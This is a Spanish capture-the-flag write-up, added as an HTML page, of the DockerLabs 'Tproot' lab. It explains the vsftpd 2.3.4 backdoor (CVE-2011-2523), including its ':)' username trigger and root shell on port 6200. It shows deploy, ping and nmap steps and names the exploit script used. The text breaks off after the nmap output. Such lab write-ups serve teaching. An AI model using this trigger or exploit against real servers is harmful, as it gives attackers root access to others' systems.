@@ -1,0 +1,1063 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Tproot — DockerLabs Writeup | Brandeiks</title>
+  <meta name="description" content="Writeup de la máquina Tproot de DockerLabs — Dificultad: Muy Fácil. Nmap → vsftpd 2.3.4 Backdoor → Root directo vía CVE-2011-2523.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:        #050a0e;
+      --bg2:       #080f14;
+      --bg3:       #0a1520;
+      --green:     #00ff88;
+      --cyan:      #00e5ff;
+      --red:       #ff2d55;
+      --yellow:    #ffd700;
+      --orange:    #ff8c00;
+      --dim:       #1a2a2e;
+      --text:      #c8d8e0;
+      --text-dim:  #4a6a74;
+      --font-mono: 'Share Tech Mono', monospace;
+      --font-main: 'Rajdhani', sans-serif;
+      --font-disp: 'Orbitron', sans-serif;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-main);
+      overflow-x: hidden;
+      cursor: none;
+    }
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,255,136,0.012) 2px, rgba(0,255,136,0.012) 4px
+      );
+      pointer-events: none; z-index: 1000;
+    }
+
+    /* CURSOR */
+    a, button { cursor: none; }
+    .cursor {
+      position: fixed; width: 10px; height: 10px;
+      background: var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9999;
+      transform: translate(-50%,-50%);
+      box-shadow: 0 0 12px var(--green); opacity: 0;
+    }
+    .cursor-ring {
+      position: fixed; width: 36px; height: 36px;
+      border: 1px solid var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9998;
+      transform: translate(-50%,-50%); opacity: 0;
+      transition: all 0.12s ease;
+    }
+
+    /* PROGRESS BAR */
+    .progress-container { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: transparent; z-index: 1001; }
+    .progress-bar { height: 100%; background: var(--green); width: 0%; transition: width 0.15s ease; box-shadow: 0 0 8px var(--green); }
+
+    /* NAV */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 500;
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 1.2rem 4rem;
+      background: rgba(5,10,14,0.92); backdrop-filter: blur(10px);
+      border-bottom: 1px solid rgba(0,255,136,0.08);
+    }
+    .nav-logo { font-family: var(--font-disp); font-size: 1rem; color: var(--green); letter-spacing: 4px; text-decoration: none; }
+    .nav-back { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); text-decoration: none; letter-spacing: 2px; transition: color 0.3s; }
+    .nav-back::before { content: '← '; }
+    .nav-back:hover { color: var(--green); }
+
+    /* HERO */
+    .writeup-hero {
+      min-height: 42vh; display: flex; align-items: flex-end;
+      padding: 8rem 4rem 3rem; position: relative; overflow: hidden;
+      border-bottom: 1px solid var(--dim);
+    }
+    .hero-grid {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+      background-size: 60px 60px;
+    }
+    .hero-glow {
+      position: absolute; width: 600px; height: 400px;
+      background: radial-gradient(ellipse, rgba(0,255,136,0.07) 0%, transparent 70%);
+      top: 0; left: 0; pointer-events: none;
+    }
+    .writeup-hero-content { position: relative; z-index: 2; max-width: 900px; }
+    .breadcrumb { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 1.2rem; }
+    .breadcrumb a { color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
+    .breadcrumb a:hover { color: var(--green); }
+    .breadcrumb span { color: var(--green); }
+    .writeup-title { font-family: var(--font-disp); font-size: clamp(2.5rem, 6vw, 4.5rem); font-weight: 900; letter-spacing: 2px; line-height: 1.1; }
+    .writeup-title span { color: var(--green); }
+    .writeup-subtitle { font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-dim); margin-top: 0.8rem; letter-spacing: 1px; }
+    .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
+    .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
+    .badge-vfacil   { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
+    .badge-docker   { color: var(--cyan);   border-color: rgba(0,229,255,0.3);  background: rgba(0,229,255,0.05); }
+    .badge-linux    { color: var(--yellow); border-color: rgba(255,215,0,0.3);  background: rgba(255,215,0,0.05); }
+    .badge-nmap     { color: var(--orange); border-color: rgba(255,140,0,0.4); background: rgba(255,140,0,0.05); }
+    .badge-vsftpd   { color: var(--red);    border-color: rgba(255,45,85,0.3);  background: rgba(255,45,85,0.05); }
+    .badge-backdoor { color: var(--green);  border-color: rgba(0,255,136,0.3);  background: rgba(0,255,136,0.05); }
+    .meta-date { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+
+    /* LAYOUT */
+    .writeup-layout {
+      display: grid; grid-template-columns: 1fr 240px;
+      gap: 3rem; max-width: 1300px; margin: 0 auto; padding: 4rem;
+    }
+
+    /* SIDEBAR */
+    .sidebar { position: sticky; top: 5rem; height: fit-content; order: 2; }
+    .sidebar-box { border: 1px solid var(--dim); padding: 1.5rem; background: var(--bg2); margin-bottom: 1.5rem; }
+    .sidebar-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--green); letter-spacing: 3px; margin-bottom: 1.2rem; }
+    .toc-list { list-style: none; display: flex; flex-direction: column; gap: 0.4rem; }
+    .toc-list a {
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim);
+      text-decoration: none; letter-spacing: 1px; transition: all 0.2s;
+      display: block; padding: 0.25rem 0.8rem;
+      border-left: 2px solid transparent;
+    }
+    .toc-list a:hover { color: var(--green); border-left-color: var(--green); }
+    .toc-list a.active { color: var(--green); border-left-color: var(--green); }
+    .info-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; }
+    .info-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 1px; }
+    .info-val { font-family: var(--font-mono); font-size: 0.72rem; }
+    .val-green  { color: var(--green); }
+    .val-cyan   { color: var(--cyan); }
+    .val-yellow { color: var(--yellow); }
+    .val-red    { color: var(--red); }
+    .val-vfacil { color: #00ffcc; }
+
+    /* ATTACK PATH */
+    .attack-path { display: flex; flex-direction: column; gap: 0; }
+    .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
+    .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
+    .ap-line { width: 1px; height: 16px; background: rgba(0,255,136,0.2); margin: 0 3.5px; }
+    .ap-text { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); line-height: 1.5; }
+    .ap-text span { color: var(--cyan); }
+
+    /* CONTENT */
+    .writeup-content { min-width: 0; order: 1; }
+
+    /* SKIP LINK */
+    .skip-link { position: absolute; top: -40px; left: 0; background: var(--green); color: var(--bg); padding: 8px 16px; z-index: 10000; text-decoration: none; font-family: var(--font-mono); font-size: 0.8rem; transition: top 0.2s; }
+    .skip-link:focus { top: 0; }
+
+    /* COPY BUTTON */
+    .copy-btn {
+      position: absolute; top: 0.5rem; right: 4.5rem;
+      background: var(--dim); border: 1px solid rgba(0,255,136,0.3);
+      color: var(--text-dim); font-family: var(--font-mono);
+      font-size: 0.62rem; padding: 0.15rem 0.5rem; letter-spacing: 1px;
+      cursor: none; opacity: 0; transition: opacity 0.2s, background 0.2s, color 0.2s;
+      z-index: 10; white-space: nowrap;
+    }
+    .cmd-block:hover .copy-btn { opacity: 1; }
+    .copy-btn:hover { background: var(--green); color: var(--bg); border-color: var(--green); }
+    .copy-btn.copied { background: var(--green); color: var(--bg); border-color: var(--green); opacity: 1; }
+
+    /* TOAST */
+    .toast {
+      position: fixed; bottom: 24px; right: 24px;
+      background: var(--green); color: #000;
+      padding: 0.7rem 1.4rem; font-family: var(--font-mono);
+      font-size: 0.75rem; letter-spacing: 2px; font-weight: 600;
+      opacity: 0; transform: translateY(8px);
+      transition: opacity 0.25s, transform 0.25s;
+      pointer-events: none; z-index: 10000;
+    }
+    .toast.show { opacity: 1; transform: translateY(0); }
+
+    /* SECTIONS */
+    .section { margin-bottom: 4rem; opacity: 0; transform: translateY(20px); transition: opacity 0.5s ease, transform 0.5s ease; }
+    .section.visible { opacity: 1; transform: translateY(0); }
+    .section-label { font-family: var(--font-mono); font-size: 0.68rem; color: var(--green); letter-spacing: 4px; margin-bottom: 0.5rem; }
+    .section-title { font-family: var(--font-disp); font-size: 1.5rem; font-weight: 700; letter-spacing: 2px; margin-bottom: 0.6rem; }
+    .section-line { width: 40px; height: 2px; background: var(--green); margin-bottom: 2rem; }
+
+    /* PROSE */
+    .prose p { font-size: 1.05rem; line-height: 1.9; color: var(--text-dim); margin-bottom: 1rem; }
+    .prose p strong { color: var(--text); }
+    .prose p .hl       { color: var(--green); font-weight: bold; }
+    .prose p .hl-cyan  { color: var(--cyan); }
+    .prose p .hl-red   { color: var(--red); }
+    .prose p .hl-yel   { color: var(--yellow); }
+
+    /* STEP */
+    .step-marker { display: flex; align-items: center; gap: 1rem; margin-bottom: 1.2rem; margin-top: 2.5rem; }
+    .step-num { font-family: var(--font-disp); font-size: 0.65rem; color: var(--bg); background: var(--green); width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: 900; }
+    .step-title { font-family: var(--font-mono); font-size: 0.8rem; color: var(--green); letter-spacing: 2px; }
+
+    /* CMD BLOCK */
+    .cmd-block {
+      background: var(--bg3); border: 1px solid rgba(0,255,136,0.15);
+      border-left: 3px solid var(--green); padding: 1rem 1.2rem;
+      margin: 1rem 0; font-family: var(--font-mono); font-size: 0.82rem;
+      overflow-x: auto; position: relative; line-height: 1.8;
+    }
+    .cmd-block .cmd-label { position: absolute; top: 0.5rem; right: 0.8rem; font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; }
+    .cmd-block .prompt { color: var(--green); user-select: none; }
+    .cmd-block .cmd    { color: var(--text); }
+    .cmd-block .flag   { color: var(--cyan); }
+    .cmd-block .arg    { color: var(--yellow); }
+    .cmd-block .comment { color: var(--text-dim); font-size: 0.75rem; }
+
+    /* OUTPUT */
+    .output-block {
+      background: #020608; border: 1px solid var(--dim);
+      padding: 1rem 1.2rem; margin: 0.5rem 0 1.5rem;
+      font-family: var(--font-mono); font-size: 0.77rem;
+      line-height: 1.9; color: var(--text-dim); overflow-x: auto;
+    }
+    .output-block .o-green  { color: var(--green); }
+    .output-block .o-cyan   { color: var(--cyan); }
+    .output-block .o-red    { color: var(--red); }
+    .output-block .o-yellow { color: var(--yellow); }
+    .output-block .o-white  { color: var(--text); }
+
+    /* INFO BOX */
+    .info-box { border: 1px solid rgba(0,229,255,0.2); background: rgba(0,229,255,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .info-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--cyan); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .info-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .info-box p strong { color: var(--cyan); }
+
+    .warn-box { border: 1px solid rgba(255,140,0,0.25); background: rgba(255,140,0,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .warn-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--orange); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .warn-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .warn-box p strong { color: var(--orange); }
+
+    /* CRED BOX */
+    .cred-box { border: 1px solid rgba(0,255,136,0.25); background: rgba(0,255,136,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; display: flex; gap: 2rem; flex-wrap: wrap; }
+    .cred-item .cred-label { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 0.3rem; }
+    .cred-item .cred-val   { font-family: var(--font-mono); font-size: 0.95rem; color: var(--green); }
+
+    /* VULN TABLE */
+    .vuln-table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    .vuln-table th, .vuln-table td { font-family: var(--font-mono); font-size: 0.72rem; padding: 0.8rem 1rem; text-align: left; border-bottom: 1px solid var(--dim); }
+    .vuln-table th { color: var(--green); letter-spacing: 2px; border-bottom-color: rgba(0,255,136,0.2); }
+    .vuln-table td { color: var(--text-dim); }
+    .vuln-table td:first-child { color: var(--cyan); }
+
+    /* DIVIDER */
+    hr.divider { border: none; height: 1px; background: linear-gradient(90deg, rgba(0,255,136,0.3), transparent); margin: 3rem 0; }
+
+    /* CMD REF SECTION */
+    .cmd-ref-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; margin-top: 1.5rem; }
+    .cmd-ref-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.5rem; transition: border-color 0.3s; }
+    .cmd-ref-card:hover { border-color: rgba(0,255,136,0.25); }
+    .cmd-ref-name { font-family: var(--font-mono); font-size: 0.9rem; color: var(--cyan); margin-bottom: 0.5rem; letter-spacing: 1px; }
+    .cmd-ref-syntax { font-family: var(--font-mono); font-size: 0.72rem; color: var(--green); background: var(--bg3); padding: 0.4rem 0.7rem; margin-bottom: 0.8rem; display: inline-block; }
+    .cmd-ref-desc { font-size: 0.92rem; color: var(--text-dim); line-height: 1.7; margin-bottom: 0.8rem; }
+    .cmd-ref-flags { list-style: none; display: flex; flex-direction: column; gap: 0.3rem; }
+    .cmd-ref-flags li { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+    .cmd-ref-flags li code { color: var(--cyan); }
+
+    /* GLOSARIO */
+    .glos-grid { display: flex; flex-direction: column; gap: 1.2rem; margin-top: 1.5rem; }
+    .glos-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.5rem; transition: border-color 0.3s; }
+    .glos-card:hover { border-color: rgba(0,255,136,0.2); }
+    .glos-term { font-family: var(--font-mono); font-size: 0.85rem; color: var(--green); margin-bottom: 0.7rem; letter-spacing: 1px; }
+    .glos-def { font-size: 0.95rem; line-height: 1.8; color: var(--text-dim); }
+    .glos-def strong { color: var(--text); }
+    .glos-def code { color: var(--cyan); font-family: var(--font-mono); font-size: 0.85em; }
+
+    /* FOOTER */
+    footer {
+      border-top: 1px solid var(--dim); padding: 2rem 4rem;
+      display: flex; justify-content: space-between;
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); letter-spacing: 1px;
+    }
+    footer span { color: var(--green); }
+
+    /* REVEAL */
+    .reveal { opacity: 0; transform: translateY(16px); transition: opacity 0.5s ease, transform 0.5s ease; }
+    .reveal.visible { opacity: 1; transform: translateY(0); }
+
+    /* RESPONSIVE */
+    @media (max-width: 900px) {
+      .writeup-layout { grid-template-columns: 1fr; padding: 2rem 1.5rem; }
+      .sidebar { position: static; order: -1; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      nav { padding: 1rem 1.5rem; }
+      .writeup-hero { padding: 6rem 1.5rem 2.5rem; }
+      footer { flex-direction: column; gap: 0.8rem; text-align: center; padding: 1.5rem; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+<a href="#main-content" class="skip-link">Saltar al contenido</a>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<!-- NAV -->
+<nav>
+  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+  <a href="../../index.html" class="nav-back">WRITEUPS</a>
+</nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <p class="breadcrumb">
+      <a href="../../index.html">WRITEUPS</a> / <a href="#">DOCKERLABS</a> / <span>MUY FÁCIL</span>
+    </p>
+    <h1 class="writeup-title"><span>Tproot</span></h1>
+    <p class="writeup-subtitle">DockerLabs — Linux · Nmap → vsftpd 2.3.4 Backdoor (CVE-2011-2523) → Root directo</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-vfacil">MUY FÁCIL</span>
+      <span class="meta-badge badge-docker">DOCKERLABS</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-nmap">NMAP</span>
+      <span class="meta-badge badge-vsftpd">VSFTPD 2.3.4</span>
+      <span class="meta-badge badge-backdoor">BACKDOOR RCE</span>
+      <span class="meta-date">// Mayo 2026</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// NAVEGACIÓN</p>
+      <ul class="toc-list">
+        <li><a href="#resumen">01 · Resumen</a></li>
+        <li><a href="#reconocimiento">02 · Reconocimiento</a></li>
+        <li><a href="#explotacion">03 · Explotación</a></li>
+        <li><a href="#post-explotacion">04 · Post-Explotación</a></li>
+        <li><a href="#comandos">05 · Referencia de Comandos</a></li>
+        <li><a href="#glosario">06 · Glosario</a></li>
+      </ul>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// FICHA TÉCNICA</p>
+      <div class="info-row"><span class="info-label">PLATAFORMA</span><span class="info-val val-cyan">DockerLabs</span></div>
+      <div class="info-row"><span class="info-label">DIFICULTAD</span><span class="info-val val-vfacil">Muy Fácil</span></div>
+      <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux Ubuntu</span></div>
+      <div class="info-row"><span class="info-label">IP TARGET</span><span class="info-val val-green">172.17.0.2</span></div>
+      <div class="info-row"><span class="info-label">PUERTOS</span><span class="info-val val-cyan">21 · 80</span></div>
+      <div class="info-row"><span class="info-label">CVE</span><span class="info-val val-red">CVE-2011-2523</span></div>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">Nmap → puertos 21, 80</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>vsftpd 2.3.4</span> identificado</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>searchsploit</span> → exploit 49757.py</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>python3 49757.py</span> → shell abierta</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot" style="background:var(--red);box-shadow:0 0 6px var(--red)"></div><div class="ap-text"><span style="color:var(--red)">whoami → ROOT ✓</span></div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="writeup-content" id="main-content">
+
+    <!-- 01 RESUMEN -->
+    <div class="section" id="resumen">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Resumen</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>
+          <strong>Tproot</strong> es una máquina de dificultad <span class="hl">muy fácil</span>
+          de la plataforma <span class="hl-cyan">DockerLabs</span>. Corre sobre <strong>Linux Ubuntu</strong>
+          y expone dos servicios: <span class="hl-cyan">FTP (puerto 21)</span> con <strong>vsftpd 2.3.4</strong>
+          y un servidor web <span class="hl-cyan">HTTP (puerto 80)</span> con Apache 2.4.58.
+        </p>
+        <p>
+          Esta máquina es un caso de estudio clásico sobre vulnerabilidades públicamente conocidas y
+          la importancia de mantener el software actualizado. El vector de ataque es completamente
+          directo: el servicio FTP ejecuta <strong>vsftpd versión 2.3.4</strong>, una versión que fue
+          comprometida en su cadena de suministro en julio de 2011. Un atacante malicioso inyectó
+          una <span class="hl-red">backdoor</span> en el código fuente oficial, haciendo que el servidor
+          abriera una shell de comandos en el <span class="hl-cyan">puerto 6200</span> al recibir
+          una cadena específica durante el proceso de login FTP.
+        </p>
+        <p>
+          A diferencia de otras máquinas de la plataforma, aquí <strong>no hay escalada de privilegios</strong>:
+          la backdoor otorga acceso como <span class="hl">root</span> directamente. El proceso completo
+          —desde el despliegue hasta la flag— se ejecuta en menos de 5 minutos, lo que la convierte
+          en una máquina ideal para entender el ciclo de reconocimiento → identificación de CVE →
+          explotación con herramientas de la comunidad.
+        </p>
+      </div>
+
+      <table class="vuln-table">
+        <thead>
+          <tr><th>Fase</th><th>Técnica / Herramienta</th><th>Resultado</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Despliegue</td><td>auto_deploy.sh + ping TTL</td><td>Máquina activa en 172.17.0.2 · Linux confirmado</td></tr>
+          <tr><td>Reconocimiento</td><td>Nmap -p- -sSCV full scan → export XML</td><td>Puerto 21 vsftpd 2.3.4 · Puerto 80 Apache 2.4.58</td></tr>
+          <tr><td>Análisis de versión</td><td>Inspección del reporte Nmap XML (xsltproc)</td><td>vsftpd 2.3.4 marcado como potencialmente vulnerable</td></tr>
+          <tr><td>Búsqueda de exploit</td><td>searchsploit vsftpd 2.3.4</td><td>CVE-2011-2523 — Backdoor Command Execution (49757.py)</td></tr>
+          <tr><td>Obtención del exploit</td><td>searchsploit -m 49757.py</td><td>Script Python copiado al directorio de trabajo</td></tr>
+          <tr><td>Explotación</td><td>python3 49757.py 172.17.0.2</td><td>Shell interactiva abierta como root</td></tr>
+          <tr><td>Post-explotación</td><td>script /dev/null -c bash · whoami · ls · cat</td><td>TTY estabilizada · root@dockerlabs · flag obtenida</td></tr>
+        </tbody>
+      </table>
+
+      <div class="info-box">
+        <p class="info-box-title">// CONTEXTO HISTÓRICO — CVE-2011-2523</p>
+        <p>
+          En <strong>julio de 2011</strong>, el repositorio oficial de vsftpd en <em>vsftpd.beasts.org</em>
+          fue comprometido. El atacante modificó el archivo fuente <code>sysdeputil.c</code> para que,
+          al recibir un nombre de usuario que contuviera el carácter <strong>":)"</strong> (carita feliz),
+          el servidor ejecutara una shell en el puerto <strong>6200/tcp</strong> con privilegios de root.
+          La backdoor estuvo disponible públicamente por menos de un día antes de ser detectada,
+          pero el impacto fue significativo dado que vsftpd era uno de los servidores FTP más usados
+          en sistemas Linux de la época. Este incidente es un ejemplo de ataque a la
+          <strong>cadena de suministro de software</strong> años antes de que el término se popularizara.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- 02 RECONOCIMIENTO -->
+    <div class="section" id="reconocimiento">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">DESPLIEGUE DE LA MÁQUINA</span>
+      </div>
+      <div class="prose">
+        <p>
+          El primer paso es desplegar el contenedor vulnerable. DockerLabs proporciona el script
+          <strong>auto_deploy.sh</strong> que construye la imagen a partir del archivo comprimido
+          <span class="hl-cyan">tproot.tar</span>, asigna automáticamente una dirección IP dentro
+          de la red interna Docker (<strong>172.17.0.x</strong>) y mantiene el contenedor activo
+          hasta que se presione <span class="hl">Ctrl+C</span>. Se requiere <strong>sudo</strong>
+          porque Docker necesita privilegios elevados para gestionar interfaces de red y el daemon
+          de contenedores.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo bash auto_deploy.sh tproot.tar">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">DEPLOY</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo bash <span class="arg">auto_deploy.sh</span> <span class="arg">tproot.tar</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Estamos desplegando la máquina vulnerable, espere un momento.</div>
+        <div>&nbsp;</div>
+        <div class="o-green">Máquina desplegada, su dirección IP es ——&gt; <strong>172.17.0.2</strong></div>
+        <div class="o-red">Presiona Ctrl+C cuando termines con la máquina para eliminarla</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">VERIFICACIÓN DE CONECTIVIDAD — PING</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con el contenedor desplegado, verificamos conectividad enviando 3 paquetes ICMP con
+          la flag <span class="hl-cyan">-c 3</span>. Más allá de confirmar que el host está activo,
+          el campo <strong>TTL</strong> de la respuesta nos permite inferir el sistema operativo
+          sin usar ninguna herramienta adicional: un <span class="hl">TTL=64</span> indica
+          <strong>Linux</strong> (Windows devuelve 128, Cisco IOS devuelve 255). En redes Docker
+          sin routers intermedios, el TTL recibido es idéntico al TTL original del host, haciendo
+          la identificación directa y fiable. Este dato orienta todo el reconocimiento posterior
+          hacia herramientas y técnicas específicas de Linux.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ping 172.17.0.2 -c 3">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PING</span>
+        <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">172.17.0.2</span> <span class="flag">-c 3</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.</div>
+        <div><span class="o-green">64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.140 ms</span></div>
+        <div><span class="o-green">64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.071 ms</span></div>
+        <div><span class="o-green">64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.060 ms</span></div>
+        <div>&nbsp;</div>
+        <div>--- 172.17.0.2 ping statistics ---</div>
+        <div>3 packets transmitted, 3 received, <span class="o-green">0% packet loss</span>, time 2012ms</div>
+        <div>rtt min/avg/max/mdev = 0.060/0.090/0.140/0.035 ms</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">ESCANEO DE PUERTOS — NMAP</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con conectividad confirmada, lanzamos un escaneo exhaustivo con <strong>Nmap</strong>.
+          Las flags utilizadas cubren el espectro completo de análisis: <span class="hl-cyan">-p-</span>
+          escanea los <strong>65,535 puertos TCP</strong> en lugar de solo los 1,000 más comunes,
+          garantizando que no se nos escape ningún servicio. <span class="hl-cyan">-sSCV</span> combina
+          SYN scan sigiloso (<code>-sS</code>), detección de versiones de servicios (<code>-sV</code>)
+          y ejecución de scripts NSE de categoría default (<code>-sC</code>), que realizan checks
+          automáticos como intentos de login anónimo en FTP, enumeración de headers HTTP, etc.
+          <span class="hl-cyan">-n</span> desactiva la resolución DNS para acelerar el proceso,
+          <span class="hl-cyan">-Pn</span> omite el host discovery (asumimos que el host está activo
+          tras el ping previo), y <span class="hl-cyan">--min-rate=5000</span> establece una tasa
+          mínima de 5,000 paquetes por segundo para completar el escaneo en segundos en lugar de
+          minutos.
+        </p>
+        <p>
+          Finalmente, <span class="hl-cyan">-oX tproot.xml</span> exporta los resultados en
+          formato XML, lo que permite procesarlos posteriormente con herramientas como
+          <strong>xsltproc</strong> para generar un reporte HTML visual y navegable —
+          una práctica recomendada para documentar hallazgos de forma profesional.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 172.17.0.2 -oX tproot.xml">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">NMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap
+          <span class="flag">-p-</span>
+          <span class="flag">-sSCV</span>
+          <span class="flag">-n</span>
+          <span class="flag">-Pn</span>
+          <span class="flag">--min-rate=5000</span>
+          <span class="flag">--open</span>
+          <span class="arg">172.17.0.2</span>
+          <span class="flag">-oX</span> <span class="arg">tproot.xml</span>
+        </span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-01 00:23 -0400</div>
+        <div>Nmap scan report for <span class="o-cyan">172.17.0.2</span></div>
+        <div>Host is up (0.0000080s latency).</div>
+        <div>Not shown: 65533 closed tcp ports (reset)</div>
+        <div>&nbsp;</div>
+        <div><span class="o-white">PORT     STATE  SERVICE  VERSION</span></div>
+        <div><span class="o-green">21/tcp   open   ftp      <strong>vsftpd 2.3.4</strong></span></div>
+        <div><span class="o-yellow">|_ftp-anon: got code 500 "OOPS: cannot change directory:/var/ftp".</span></div>
+        <div><span class="o-cyan">80/tcp   open   http     Apache httpd 2.4.58 ((Ubuntu))</span></div>
+        <div>|_http-server-header: Apache/2.4.58 (Ubuntu)</div>
+        <div>|_http-title: Apache2 Ubuntu Default Page: It works</div>
+        <div>MAC Address: 3E:AE:F1:BE:BE:D4 (Unknown)</div>
+        <div>Service Info: OS: Unix</div>
+        <div>&nbsp;</div>
